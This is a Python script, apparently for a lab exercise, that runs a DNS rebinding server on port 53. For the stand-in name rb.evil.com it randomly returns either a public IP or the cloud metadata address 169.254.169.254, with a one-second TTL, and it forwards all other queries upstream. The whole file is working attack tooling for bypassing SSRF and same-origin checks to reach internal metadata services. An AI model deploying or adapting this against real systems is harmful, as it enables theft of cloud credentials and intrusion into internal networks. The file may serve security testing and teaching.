from dnslib import DNSRecord, RR, A, QTYPE
from dnslib.server import DNSServer, BaseResolver
import random

# Upstream DNS server for normal lookups
UPSTREAM_DNS = ("127.0.0.53", 53)

# Domain you want to rebind (for local lab you can keep rb.evil.com;
# globally you'd need a domain you control)
REBIND_NAME = "rb.evil.com"

BENIGN_IP = "146.190.62.39"
INTERNAL_IP = "169.254.169.254"

class RebindResolver(BaseResolver):
    """
    DNS resolver that:
      - For REBIND_NAME A queries: randomly returns BENIGN_IP or INTERNAL_IP.
      - For all other names/types: forwards to UPSTREAM_DNS and returns its reply.
    """

    def _answer_rebind_random(self, request, qname_str):
        reply = request.reply()
        ip = random.choice([BENIGN_IP, INTERNAL_IP])
        reply.add_answer(RR(qname_str, QTYPE.A, rdata=A(ip), ttl=1))
        print(f"[DNS] REBIND {qname_str} -> {ip}")
        return reply

    def _forward_upstream(self, request):
        """
        Forward query to upstream DNS (e.g. 8.8.8.8) and return its full response.
        Uses dnslib's DNSRecord.send() helper to avoid low-level socket issues.
        """
        try:
            # Build a DNSRecord from the incoming request
            q = DNSRecord(
                request.header,
                request.questions,
                request.rr,
                request.auth,
                request.ar
            )
            # Send to upstream and get raw response
            resp_data = q.send(UPSTREAM_DNS[0], UPSTREAM_DNS[1], timeout=2.0)
            upstream_reply = DNSRecord.parse(resp_data)
            print(f"[DNS] FORWARD {request.q.qname} via {UPSTREAM_DNS[0]}")
            return upstream_reply
        except Exception as e:
            print(f"[DNS] Upstream error for {request.q.qname}: {e}")
            return request.reply()

    def resolve(self, request, handler):
        qname = str(request.q.qname).rstrip('.')
        qtype = QTYPE[request.q.qtype]
        print(f"[DNS] Query: {qname} ({qtype})")

        # Only rebind A/ANY on the chosen name
        if qname == REBIND_NAME and qtype in ("A", "ANY"):
            return self._answer_rebind_random(request, qname)

        # Everything else: forward upstream
        return self._forward_upstream(request)


if __name__ == "__main__":
    ADDRESS = "127.0.0.1"
    PORT = 53  # so /etc/resolv.conf can use it

    resolver = RebindResolver()
    server = DNSServer(resolver, port=PORT, address=ADDRESS)
    server.start()
    print(f"[*] Rebinding DNS server started at {ADDRESS}:{PORT}, rebind name = {REBIND_NAME}")